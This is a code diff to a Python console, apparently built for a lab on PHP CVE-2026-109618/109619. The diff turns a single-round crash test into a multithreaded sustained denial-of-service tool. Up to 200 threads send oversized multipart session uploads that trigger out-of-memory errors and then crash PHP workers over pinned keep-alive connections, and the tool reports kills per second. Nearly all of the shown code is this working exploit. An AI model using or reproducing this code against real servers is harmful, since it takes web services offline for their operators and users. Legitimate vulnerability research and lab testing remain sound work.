@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """Interactive diagnostic console for the PHP CVE-2026-109618/109619 lab."""
 
+import http.client
 import json
 import secrets
 import shlex
@@ -81,6 +82,7 @@ Settable parameters (payload sizes are explicit; check effective endpoint limits
   session-health <path>       Session health endpoint (default: session/health.php)
   session-upload <path>       Session upload endpoint (default: session/upload.php)
   session-name <name>         PHP session cookie name (default: PHPSESSID)
+  threads <n>                 DoS concurrency (default: 10)
   part-headers <n>            Part header count (default: 653000)
   empty-files <n>             Empty file count (conditional experiment)
   field-bytes <n>             Form value / session padding size (default: 6 MiB)
@@ -110,6 +112,7 @@ class Console:
         self.pad_kib = 1340
         self.field_name_kib = 700
         self.session_name = "PHPSESSID"
+        self.dos_threads = 10
         self.timeout = 60.0
         self.expected_php = "8.5.11"
 
@@ -232,6 +235,7 @@ class Console:
         for k, v in self.endpoints.items():
             print(f"  {k:16s} {v}")
         print(f"  session-name:  {self.session_name}")
+        print(f"  threads:       {self.dos_threads}")
         print(f"  part-headers:  {self.part_headers:,}")
         print(f"  empty-files:   {self.empty_files:,}")
         print(f"  field-bytes:   {self.field_bytes:,} ({human_size(self.field_bytes)})")
@@ -425,67 +429,84 @@ class Console:
             else:
                 print("  Worker survived — may need a different endpoint or settings")
 
+    def _dos_round(self, upload_path, producer_body, consumer_body):
+        sid = secrets.token_hex(16)
+        cookie = f"{self.session_name}={sid}"
+        headers = {
+            "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
+            "Cookie": cookie,
+            "Connection": "keep-alive",
+        }
+        conn = http.client.HTTPConnection(self.host, self.port,
+                                          timeout=self.timeout)
+        try:
+            conn.request("POST", upload_path, body=producer_body, headers=headers)
+            resp = conn.getresponse()
+            body = resp.read(2048)
+            if b"Allowed memory size" not in body:
+                return "no_oom"
+            conn.request("POST", upload_path, body=consumer_body, headers=headers)
+            resp = conn.getresponse()
+            resp.read()
+            return "survived"
+        except (OSError, http.client.HTTPException):
+            return "crashed"
+        finally:
+            conn.close()
+
     def cmd_dos(self, rounds_str=None):
+        import threading
         self.require_target()
         rounds = int(rounds_str) if rounds_str else 0
+        threads = self.dos_threads
         label = f"{rounds} rounds" if rounds else "infinite — Ctrl+C to stop"
-        print(f"\033[93m[CVE-2026-109619] Sustained DoS ({label})\033[0m")
+        print(f"\033[93m[CVE-2026-109619] Sustained DoS ({label}, {threads} threads)\033[0m")
         upload_path = self.path("session-upload")
+        producer_body = multipart_producer(self.field_bytes, "candidate",
+                                           part_headers=self.part_headers)
         consumer_body = multipart_consumer()
+        print(f"  Keep-alive pinning: Producer A + Consumer B on same connection")
+        print(f"  Payload: {human_size(len(producer_body))}\n")
+        lock = threading.Lock()
         crashed = 0
         failed = 0
+        counter = 0
+        stop = threading.Event()
         start = time.monotonic()
-        current_pid = None
-        i = 0
-        try:
-            while rounds == 0 or i < rounds:
-                i += 1
-                sid = secrets.token_hex(16)
-                cookie = f"{self.session_name}={sid}"
-                if current_pid is None:
-                    probe = send(self.scheme, self.host, self.port, "GET",
-                                 upload_path, self.timeout, None, f"dos-baseline-{i}")
-                    if "transport_error" in probe:
-                        print(f"  #{i}: \033[91mserver unreachable\033[0m")
+
+        def worker():
+            nonlocal crashed, failed, counter
+            while not stop.is_set():
+                with lock:
+                    if rounds and counter >= rounds:
+                        return
+                    counter += 1
+                    my_i = counter
+                result = self._dos_round(upload_path, producer_body, consumer_body)
+                with lock:
+                    if result == "crashed":
+                        crashed += 1
+                        elapsed = time.monotonic() - start
+                        rate = crashed / elapsed if elapsed > 0 else 0
+                        print(f"  #{my_i}: \033[92mcrashed\033[0m"
+                              f"  ({crashed} kills, {rate:.2f}/s)")
+                    else:
                         failed += 1
-                        time.sleep(0.5)
-                        continue
-                    current_pid = probe.get("worker_pid_header")
-                producer_body = multipart_producer(self.field_bytes, "candidate",
-                                                   part_headers=self.part_headers)
-                producer, _ = session_request(
-                    self.scheme, self.host, self.port, "POST",
-                    upload_path, body=producer_body, cookie=cookie,
-                    timeout=self.timeout)
-                body_text = producer.get("body_prefix", "")
-                if "Allowed memory size" not in body_text:
-                    print(f"  #{i}: \033[91mno OOM\033[0m")
-                    failed += 1
-                    continue
-                consumer, _ = session_request(
-                    self.scheme, self.host, self.port, "POST",
-                    upload_path, body=consumer_body, cookie=cookie,
-                    timeout=self.timeout)
-                if "transport_error" not in consumer:
-                    print(f"  #{i}: \033[93mworker survived\033[0m")
-                    failed += 1
-                    continue
-                verify = send(self.scheme, self.host, self.port, "GET",
-                              upload_path, self.timeout, None, f"dos-verify-{i}")
-                new_pid = verify.get("worker_pid_header") if "transport_error" not in verify else None
-                if current_pid and new_pid and current_pid != new_pid:
-                    print(f"  #{i}: \033[92mPID {current_pid} → {new_pid}\033[0m")
-                elif "transport_error" in verify:
-                    print(f"  #{i}: \033[92mcrashed + server down\033[0m")
-                else:
-                    print(f"  #{i}: \033[92mcrashed\033[0m")
-                crashed += 1
-                current_pid = new_pid
+                        print(f"  #{my_i}: \033[91m{result}\033[0m")
+
+        pool = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
+        try:
+            for t in pool:
+                t.start()
+            for t in pool:
+                while t.is_alive():
+                    t.join(0.2)
         except KeyboardInterrupt:
+            stop.set()
             print()
         elapsed = time.monotonic() - start
         print(f"\n\033[93m  {crashed} workers crashed, {failed} failed,"
-              f" {i} rounds in {elapsed:.1f}s\033[0m")
+              f" {counter} rounds in {elapsed:.1f}s\033[0m")
         if crashed and elapsed > 0:
             print(f"  \033[92m{crashed / elapsed:.2f} crashes/sec\033[0m")
 
@@ -505,6 +526,12 @@ class Console:
         elif key == "session-name":
             self.session_name = value
             print(f"  session-name = {self.session_name}")
+        elif key == "threads":
+            number = int(value)
+            if number < 1 or number > 200:
+                raise ValueError("threads must be 1..200")
+            self.dos_threads = number
+            print(f"  threads = {self.dos_threads}")
         elif key == "part-headers":
             number = int(value)
             if number < 1:
